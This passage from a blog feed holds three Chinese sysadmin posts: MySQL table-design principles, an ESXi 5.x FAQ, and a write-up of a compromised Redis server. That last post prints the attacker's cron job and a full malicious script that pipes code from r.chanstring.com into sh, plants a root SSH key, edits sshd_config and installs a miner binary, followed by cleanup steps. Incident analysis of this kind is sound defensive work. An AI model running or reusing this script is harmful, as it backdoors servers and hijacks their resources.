<h4 id="二、表设计原则"><a href="#二、表设计原则" class="headerlink" title="二、表设计原则"></a>二、<b>表设计原则</b></h4><p>[职责分离原则]<br>通常指数据的产生和使用，每个系统相互独立，通常取决于以下几点</p>
<ul>
<li>数据的产生：通常谁产生谁负责，维护数据的正个生命周期，产生，修改，销毁等周期。</li>
<li>使用数据者：谁使用谁维护</li>
<li>考虑高内聚，低耦合：在存放数据的时候如果考虑到数据使用原则导致了相关度非常高的数据存放在多个地方，需要多个系统来维护这个数据就有可能导致系统间的耦合性增强，应当尽量避免</li>
</ul>
<p>在设计数据库表间的关系时也要遵循相同原则，职责分离降低耦合，但同时要考虑到性能情况，做到适当冗余而不导致修改逻辑复杂</p>
<p>[在线处理和分析分离]</p>
<ul>
<li>为了保证生产环境数据处理性能，需要将一些分析相关的数据及结果单独库存储，避免在数据分析的时候导致业务数据吞吐量下降，引起系统问题</li>
<li>专门用于存放离线报表数据，并提供线上数据查询方法，建议将统计结果，汇总的数据都从在线处理数据库中移走</li>
</ul>
<p>原则上要将在线用户请求和后台统计请求分开:</p>
<p>a. 将后台统计与生产库分开(一般使用slave)，缺点是数据量大了玩不转。<br>b. 建立离线报表，专门存放统计结果，计算与展示异步处理，缺点是实时业务响应差。<br>c. 实时拉取mysql row binlog，做数据的异构处理(tungsten, canal)，将增量结果处理后(storm)，保存在数据库中，基本实时。</p>
<p>[事物与日志分离]</p>
<p>通常用户生成的内容和用户行为的日志要分开，eg:</p>
<p>游戏DB里存放玩家的基础信息，装备，属性，好友列表等等，这些放到数据库里面。但是玩家的行为日志，比如消耗金币，今天下过哪些副本，买过什么顶级装备，这些属于行为日志，应该单独存放并分析处理。</p>
<p>对于web，有好多用户置顶，刷新，竞价，展示等行为，要求实时并且量很大，一定要和贴子分开。</p>
<p>行为日志，需要做分析处理，并且由于时效性不宜存储在mysql中，后期维护就是地雷。</p>
<p>[历史可追溯]</p>
<p>保障数据可追溯，应当遵循一些简单的约定，事后方便数据的查询和统计：</p>
<ul>
<li><p>对于状态数据，应当设计相应状态的字段来保存该数据的最后状态，同时记录下来该数据的初始创建人，时间以及该数据的最后修改人和修改时间；所以在交易数据（如订单合同），广告数据，账户表等都应该默认有状态（status），创建人（creator/creator_name），创建时间（created_at），最后修改人（modifier/modifier_name），最后修改时间（modified_at）等字段用来表明数据的当前状态，创建信息及修改信息。</p>
</li>
<li><p>针对需要跟踪每次修改的数据，需要在数据发生变化的时候记录一张日志表，用于记录该数据发生变化的全生命周期。针对只需要关注关键字段变化的情况，则日志表中只需要记录关键字段变化即可，但操作人，操作类型，时间应当准确记录，日志表数据一旦生成不允许进行修改。如用户账户的充值流水，消费流水都是一些业务紧相关的日志。而审核日志，操作记录等日志则属于与业务关联较小的日志。</p>
</li>
<li><p>针对所有历史需要保留的数据则需要每次变化都生成一个新的版本，比如类目信息等，对原始数据永远只做insert操作，不做delete及update操作。但这种情况仅限于极端数据历史要求极高的情况下使用。</p>
</li>
</ul>
<p>ref </p>
<p><a href="http://verynull.com/2016/06/29/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E8%A7%84%E8%8C%83" target="_blank" rel="external">Mysql数据库设计规范</a><br><a href="http://www.cnblogs.com/chenpingzhao/p/5059985.html" target="_blank" rel="external">数据库使用的一些规范</a><br><a href="http://www.biaodianfu.com/mysql-best-practices.html" target="_blank" rel="external">MySQL命名、设计及使用规范</a><br><a href="https://github.com/sjqzhang/webtech/blob/master/doc/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E8%A7%84%E8%8C%83.md" target="_blank" rel="external">数据库设计规范.md</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      mysql database desgin guideline
    
    </summary>
    
    
      <category term="mysql" scheme="https://t1ger.github.io/tags/mysql/"/>
    
      <category term="desgin" scheme="https://t1ger.github.io/tags/desgin/"/>
    
  </entry>
  
  <entry>
    <title>ESXi-5.x FAQ</title>
    <link href="https://t1ger.github.io/2016/11/11/ESXi-5-x-FAQ/"/>
    <id>https://t1ger.github.io/2016/11/11/ESXi-5-x-FAQ/</id>
    <published>2016-11-11T01:43:30.000Z</published>
    <updated>2016-11-11T02:53:05.463Z</updated>
    
    <content type="html"><![CDATA[<p>问题1:远程控制台中键入时出现重复字符<br>解决方法：</p>
<ul>
<li>关闭虚拟机</li>
<li>在虚拟机的配置 (.vmx) 文件结尾添加类似如下的一行：keyboard.typematicMinDelay = “2000000”<br>延迟时间单位指定为微秒，因此以上示例中的行将重复时间增加至 2 秒。</li>
<li>启动此虚拟机<br>如果使用 vSphere Client 进行更改，请执行以下操作：</li>
<li>关闭虚拟机电源</li>
<li>右键单击虚拟机，选择编辑设置</li>
<li>单击选项&gt;常规&gt;配置&gt;配置参数</li>
<li>单击添加行</li>
<li>在“名称”下，输入 keyboard.typematicMinDelay 在值字段中输入 2000000</li>
<li>单击确定</li>
<li>打开虚拟机电源</li>
</ul>
<p>问题2:vmware workstation 迁移至EXSI</p>
<ul>
<li>关闭虚拟机</li>
<li>copy 文件到EXSI服务器</li>
<li>vmkfstools -i “/vmfs/volumes/Datastore/examplevm/examplevm.vmdk” “/vmfs/volumes/Datastore 2/newexamplevm/newexamplevm.vmdk” -d thin -a buslogic </li>
<li>在EXSI服务器上编辑该虚拟机，添加磁盘，使用已经存在的虚拟机，即转换后的那个</li>
<li>启动虚拟机</li>
</ul>
<p>问题3:减小 vCenter Server 数据库的大小</p>
<ul>
<li>确保已经完好备份 vCenter Server Database</li>
<li>关闭 VMware VirtualCenter Server 服务及任何其他使用该数据库的服务</li>
<li>截断 VPX_HIST_STAT1 表及相应的 VPX_SAMPLE_TIME1 表。 截断完成后，验证汇总作业现在是否已成功完成。<br>注意： 在 vCenter Server 5.1 和 5.5 中，表名称为 VPX_HIST_STAT1_n。参考<a href="https://kb.vmware.com/selfservice/microsites/search.do?language=en_US&amp;cmd=displayKC&amp;externalId=2038474" target="_blank" rel="external">Troubleshooting VPX_HIST_STAT table sizes in VMware vCenter Server 5.x</a><br>注意： 要减小 vCenter Server 数据库的大小，还可以删除 VPX_EVENT、VPX_EVENT_ARG 和 VPX_TASK 表中的数据.参考<a href="https://kb.vmware.com/selfservice/search.do?cmd=displayKC&amp;docType=kc&amp;docTypeID=DT_KB_1_1&amp;externalId=1025914" target="_blank" rel="external">Purging old data from the database used by vCenter Server (1025914)</a></li>
<li>要运行汇总脚本，请执行以下步骤：<br>  a.使用 SQL Management Studio 连接到 vCenter Server 的 SQL 数据库。<br>  b.导航到 SQL Server Agent &gt; 作业。<br>  c.选择各个汇总作业，然后右键单击并选择启动作业于步骤。</li>
<li>启动 VMware VirtualCenter Server 服务及任何其他在步骤 2 中停止的服务</li>
</ul>
<p>问题4:dell服务器故障收集</p>
<ul>
<li>开启ssh终端，使用dell Exsi5收集脚本收集。</li>
</ul>
<p>ref</p>
<p><a href="http://kb.vmware.com/selfservice/microsites/search.do?language=en_US&amp;cmd=displayKC&amp;externalId=2075522" target="_blank" rel="external">在远程控制台中键入时出现重复字符</a><br><a href="http://blog.csdn.net/zhgn2/article/details/18603529" target="_blank" rel="external">ESXI 5.5的搭建以及VMware9.0的虚拟机移植</a><br><a href="https://kb.vmware.com/selfservice/microsites/search.do?language=en_US&amp;cmd=displayKC&amp;externalId=1028042" target="_blank" rel="external">Cloning and converting virtual machine disks with vmkfstools</a><br><a href="https://kb.vmware.com/selfservice/microsites/search.do?cmd=displayKC&amp;docType=kc&amp;externalId=2077855" target="_blank" rel="external">当汇总脚本需要很长时间才能运行时减小 vCenter Server 数据库的大小</a><br><a href="ftp://64.199.0.197/" target="_blank" rel="external">dell收集工具exsi5_TTY.sh</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      vmware faq
    
    </summary>
    
    
      <category term="vmware" scheme="https://t1ger.github.io/tags/vmware/"/>
    
      <category term="EXSI" scheme="https://t1ger.github.io/tags/EXSI/"/>
    
  </entry>
  
  <entry>
    <title>Recent Redis hacking</title>
    <link href="https://t1ger.github.io/2016/11/04/Recent-Redis-hacking/"/>
    <id>https://t1ger.github.io/2016/11/04/Recent-Redis-hacking/</id>
    <published>2016-11-04T05:18:04.000Z</published>
    <updated>2016-11-04T07:38:35.635Z</updated>
    
    <content type="html"><![CDATA[<p>早上接到cpu负载报警，发现服务器被黑了，又成人家肉鸡了。</p>
<p>登陆系统查看，发下防火墙被关了，crontab被清空重写了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#crontab -l</div><div class="line">*/10 * * * * curl -fsSL http://r.chanstring.com/pm.sh?106 | sh</div></pre></td></tr></table></figure>
<p>查看脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin</div><div class="line"></div><div class="line">echo &quot;*/10 * * * * curl -fsSL http://r.chanstring.com/pm.sh?106 | sh&quot; &gt; /var/spool/cron/root</div><div class="line">mkdir -p /var/spool/cron/crontabs</div><div class="line">echo &quot;*/10 * * * * curl -fsSL http://r.chanstring.com/pm.sh?106 | sh&quot; &gt; /var/spool/cron/crontabs/root</div><div class="line"></div><div class="line">if [ ! -f &quot;/root/.ssh/KHK75NEOiq&quot; ]; then</div><div class="line">	mkdir -p ~/.ssh</div><div class="line">	rm -f ~/.ssh/authorized_keys*</div><div class="line">	echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzwg/9uDOWKwwr1zHxb3mtN++94RNITshREwOc9hZfS/F/yW8KgHYTKvIAk/Ag1xBkBCbdHXWb/TdRzmzf6P+d+OhV4u9nyOYpLJ53mzb1JpQVj+wZ7yEOWW/QPJEoXLKn40y5hflu/XRe4dybhQV8q/z/sDCVHT5FIFN+tKez3txL6NQHTz405PD3GLWFsJ1A/Kv9RojF6wL4l3WCRDXu+dm8gSpjTuuXXU74iSeYjc4b0H1BWdQbBXmVqZlXzzr6K9AZpOM+ULHzdzqrA3SX1y993qHNytbEgN+9IZCWlHOnlEPxBro4mXQkTVdQkWo0L4aR7xBlAdY7vRnrvFav root&quot; &gt; ~/.ssh/KHK75NEOiq</div><div class="line">	echo &quot;PermitRootLogin yes&quot; &gt;&gt; /etc/ssh/sshd_config</div><div class="line">	echo &quot;RSAAuthentication yes&quot; &gt;&gt; /etc/ssh/sshd_config</div><div class="line">	echo &quot;PubkeyAuthentication yes&quot; &gt;&gt; /etc/ssh/sshd_config</div><div class="line">	echo &quot;AuthorizedKeysFile .ssh/KHK75NEOiq&quot; &gt;&gt; /etc/ssh/sshd_config</div><div class="line">	/etc/init.d/sshd restart</div><div class="line">fi</div><div class="line"></div><div class="line">if [ ! -f &quot;/etc/init.d/ntp&quot; ]; then</div><div class="line">	if [ ! -f &quot;/etc/systemd/system/ntp.service&quot; ]; then</div><div class="line">		mkdir -p /opt</div><div class="line">		curl -fsSL http://r.chanstring.com/v51/lady_`uname -m` -o /opt/KHK75NEOiq33 &amp;&amp; chmod +x /opt/KHK75NEOiq33 &amp;&amp; /opt/KHK75NEOiq33 -Install</div><div class="line">	fi</div><div class="line">fi</div><div class="line"></div><div class="line">/etc/init.d/ntp start</div><div class="line"></div><div class="line">ps auxf|grep -v grep|grep &quot;/usr/bin/cron&quot;|awk &apos;&#123;print $2&#125;&apos;|xargs kill -9</div><div class="line">ps auxf|grep -v grep|grep &quot;/opt/cron&quot;|awk &apos;&#123;print $2&#125;&apos;|xargs kill -9</div></pre></td></tr></table></figure>
<p>分析脚本，我们需要删除相应程序及进程</p>
<ul>
<li>清理crontab 任务</li>
<li>清理.ssh/KHK75NEOiq,恢复/etc/ssh/sshd_config文件或者用其他服务器文件替换，并重启sshd服务。</li>
<li>清理 /etc/init.d/ntp删除并kill掉它启动的进程</li>
<li>清理/usr/local/etc/minerd.conf </li>
</ul>
<p>通过top观察负载，查看是否有minerd进程及ntp进程。</p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      hacking redis server
    
    </summary>
    
    
  </entry>
  
</feed>
